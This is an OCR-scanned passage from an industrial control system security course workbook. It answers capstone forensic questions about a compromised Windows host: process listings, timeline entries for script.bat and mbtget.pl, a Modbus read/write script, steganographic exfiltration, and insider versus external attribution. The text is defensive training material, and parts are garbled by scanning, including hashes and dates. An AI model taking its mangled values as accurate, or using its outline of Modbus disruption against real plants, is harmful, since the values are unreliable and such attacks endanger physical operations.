Hierarchical Processes @ corssexe 92 1388 CAWindows\system32 %SystemRoot\system32\csrss.exe Object ”
, fe nem 4B svchostexe 85 2704 CAWindows\System32 CAWindows\System32\svchostexe -k secs
Regt'y a
Windows Services © taskhostexe 61 628 (on
Persistence as — . ”
© cmdexe rr 2964 CAWindows)System32 cmd fe “C\temp\0001 bat” * |
Users ‘
Event Logs © onder Me™ 38 3768 ae cmd /e *CA\Userstin Gary/\script.bat” *
isn
.
(8
a a se 7
21. Was “In Gary” an Administrator? Yes
~
(8

Since he is executing new programs, it is important to see if “In Gary” was an administrator and if it was
always this way. I.e. did he or someone else elevate his privileges? If so when that occurred can also be

interesting. By clicking the Users tab, we can see that the user “In Gary” was an Administrator. This is of
something to take note of since he is the only person to have logged in within the last few months outside f
of the Administrator account. Re
o
”
22. When was the script from the network captures created on the system? _ 2015-01-27 at 00:30:52 Zulu
7
© 2021, Robert M. Lee 1CS515 Day Five Mini-Capstone 10 wy
»
a

Ww
ay av ay ww ary ay uw ay

av

ae we

23.

Timeline information is almost always interesting to fully understanding all the events and the other
activity associated with them. In Redline, choose the Timeline tab and search for “script.bat” to see when
it first comes up in the timeline.

script.bat » “s In All Fields =~ | Clear All Filters Prev = Next | Passed the end

Summary

Path: C:\Users\in Gary MEpees MDS: 19c443fc16892ase7cd7G.. User: WORKSTATIONT\Valley...

Path: Software\Microsoft\Windows\CurrentVersion\Expiorer\ComDig3.. Type: REG_XEY Value:

Path: Software\Microsoft\Windows\CurrentVersion\Explorer\ComDig3... Type: REG_SIN.. Value:

Double clicking that record will reveal that the file was created on 2015-0-1-27 at 00:30:522.

By searching for “mbtget.p!” in the timeline, we find that it was created on “2014-08-27” which places
it before the script.bat. It seems this file was downloaded and then later called in script.bat once the
targets were identified.

What is the script’s MD5 hash? 19c443fc16892aae7c47dc068fd1i0b46

In the same view, we see the MD5 of that file, the script, is 19c443fc16892aae7c47dc068fd10b46. Hashes
are useful in each phase in the ACDC. They should not be over relied upon for detecting threats but can
help quickly scope an environment for an infection and help with keeping track of the threat faced.

*Note* The following questions will require open source research/Internet searching:

With information about the script, it is now possible to perform some threat analysis and determine what is
being faced. This will give a better understanding of what needs to be done in terms of cleanup as well as the
potential damage that could occur or was prevented by the incident response. Additionally, any information
uncovered might be shareable with peers in the community to ensure that if this is an external threat, the
community can respond to it together instead of each having to face the threat independently.

24.

25.

26.

What code repository can the malicious script be found on? Sourceperl - GitHub
Script.bat is a generic name; however, we know that the real damaging program was likely the Perl script.
Therefore, we can perform a Google search for mbtget.p! which will lead to the “sourceperl” GitHub
account. It states that mbtget is a simple perl script to make transactions with Modbus TCP clients.

Can the script just read registers or also write to them? Read and Write
The script has the capability to read and write to clients; therefore, it can potentially disrupt operations.

Did the use of the script (by its configuration) seem targeted? Yes

Analyzing the script fully will help; however, we know from the network traffic that only the four control
devices were targeted—there were no other scans on the network to devices that didn’t exist. The default
configuration for the script from the source page does not indicate that those devices are hardcoded into
the script. Therefore, our attacker likely had good knowledge of the facility.

© 2021, Robert M. Lee ICS515 Day Five Mini-Capstone 11
27. Was this likely the work of an external or insider threat? External

Right now, we cannot definitely say what type of threat group we are facing. However, the internal
control zone was accessible to the Internet through the DMZ and there were weird, potentially malicious,
files being downloaded. That revealed that there was malicious behavior such as theft of data related to
the HMI login and passwords previously occurring in the environment. After that we see that there was a
common script used, but tailored to our environment, that disrupted the ICS network. It is unlikely that
there is an insider threat with all these pieces of information—however, the use of the steganography tool
on the system would indicate that this activity is potentially an external threat. At this point, it is
appropriate to assume either; however, follow-on analysis, questioning of personnel, and more may
reveal more concrete evidence.

28. What kind of information could be shared to help the community? Lessons Learned

In this case, there is not a set of malware variants or anything similar to truly share with the community.
However, the freefirmware website, the mbtget script showing up, exfiltration of data through steghide,
etc. could all be summarized in a nice lessons-learned document that also tells folks what actions were
taken to uncover and respond to these findings. These types of lessons-learned documents made and
shared throughout the community make defenders better.

Scenario One Takeaways

In the scenario, it appears that the threat uncovered is actually an external threat. The script that was used
was publicly available, but it was targeted specifically to the control devices on the network. This would take
knowledge of the facility likely through previous espionage. It is possible that the steganography tool was
being used as initial espionage. , Appropriate personnel could find the user associated with the “In Gary”
account and question them. Other checks such as physical security controls, times of shifts, etc. could be used
to see who the culprit might be. Just because it was an “In Gary” account does not mean that the person who
uses that account is necessarily the threat. Most importantly, though, the threat was identified and can be
easily remediated by cleaning the infected Windows systems (hopefully the facility has good backups). This
will safeguard the operations. The Threat and Environment Manipulation folks can make some good
recommendations on better DMZ firewall and IDS rules and the Threat Intelligence Consumption folks can
make others in the community aware of the freefirmware site and the MBTget script. It is unlikely others will
face this issue, but it is possible.

The concept of the Active Cyber Defense Cycle can be employed in a number of different ways. In this scenario
it was a one-person process. Ideally, an organization can employ multiple teams where specialization and
focus can occur—but that is not always the reality. It is possible to work through ACDC as a single person. The
model then can provide guidance on what things a person should be considering and what actions to take
next. Having a model to guide actions, especially when dealing with threats, can make a significant difference
in achieving success.

© 2021, Robert M. Lee 1CS515 Day Five Mini-Capstone 12

(B)
